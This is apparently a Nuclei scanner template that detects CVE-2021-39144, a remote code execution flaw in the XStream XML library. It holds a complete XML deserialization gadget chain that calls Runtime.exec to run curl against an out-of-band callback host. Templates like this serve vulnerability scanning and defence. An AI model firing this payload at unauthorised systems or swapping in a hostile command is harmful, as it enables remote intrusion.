id: CVE-2021-39144

info:
  name: XStream - Remote Code Execution
  author: pwnhxl
  severity: high
  description: |
    XStream is a simple library to serialize objects to XML and back again. In affected versions this vulnerability may allow a remote attacker has sufficient rights to execute commands of the host only by manipulating the processed input stream. No user is affected, who followed the recommendation to setup XStream's security framework with a whitelist limited to the minimal required types. XStream 1.4.18 uses no longer a blacklist by default, since it cannot be secured for general purpose.
  reference:
    - http://x-stream.github.io/CVE-2021-39144.html
    - https://x-stream.github.io/CVE-2021-39144.html
    - https://github.com/x-stream/xstream/security/advisories/GHSA-j9h8-phrw-h4fh
    - https://security.netapp.com/advisory/ntap-20210923-0003/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 8.5
    cve-id: CVE-2021-39144
    cwe-id: CWE-94,CWE-502
  tags: cve,cve2021,xstream,deserialization,rce,kev

requests:
  - raw:
      - |
        POST / HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/xml

        <java.util.PriorityQueue serialization='custom'>
          <unserializable-parents/>
          <java.util.PriorityQueue>
            <default>
              <size>2</size>
            </default>
            <int>3</int>
            <dynamic-proxy>
              <interface>java.lang.Comparable</interface>
              <handler class='sun.tracing.NullProvider'>
                <active>true</active>
                <providerType>java.lang.Comparable</providerType>
                <probes>
                  <entry>
                    <method>
                      <class>java.lang.Comparable</class>
                      <name>compareTo</name>
                      <parameter-types>
                        <class>java.lang.Object</class>
                      </parameter-types>
                    </method>
                    <sun.tracing.dtrace.DTraceProbe>
                      <proxy class='java.lang.Runtime'/>
                      <implementing__method>
                        <class>java.lang.Runtime</class>
                        <name>exec</name>
                        <parameter-types>
                          <class>java.lang.String</class>
                        </parameter-types>
                      </implementing__method>
                    </sun.tracing.dtrace.DTraceProbe>
                  </entry>
                </probes>
              </handler>
            </dynamic-proxy>
            <string>curl http://{{interactsh-url}} -H 'User-Agent: {{rand_base(6)}}'</string>
          </java.util.PriorityQueue>
        </java.util.PriorityQueue>

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"

      - type: word
        part: interactsh_request
        words:
          - "User-Agent: {{rand_base(6)}}"
